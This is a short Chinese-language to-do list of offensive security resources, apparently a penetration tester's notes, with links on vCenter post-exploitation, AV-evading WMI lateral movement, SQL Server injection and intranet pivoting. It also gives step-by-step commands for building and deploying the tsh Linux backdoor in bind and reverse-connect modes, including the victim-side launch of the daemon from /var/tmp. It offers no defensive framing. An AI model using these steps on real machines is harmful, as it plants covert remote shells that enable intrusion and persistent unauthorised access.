# To Do
```
0x01 vCenter后利用
https://forum.butian.net/share/1987

0x02 【免杀的】横向移动命令执行
https://github.com/rootclay/WMIHACKER

0x03 ASPX网站数据库密码加密存储
https://github.com/aleenzz/InjectSQLServer

0x04 Linux后门
https://github.com/orangetw/tsh

正向
vim tsh.h
#删除两个call_back字段
设置密码
make linux
执行./tshd
在控制端执行./tsh ip

反向
git clone https://github.com/orangetw/tsh.git
cd tsh
vim tsh.h
#控制端
make linux
./tsh cb
#被控端
umask 077; HOME=/var/tmp ./tshd
./tshd


内网渗透的一些思路分享
https://mp.weixin.qq.com/s/tqd9jJJv4bmzN6xVdpGDow
```



# 参考
https://github.com/safe6Sec/command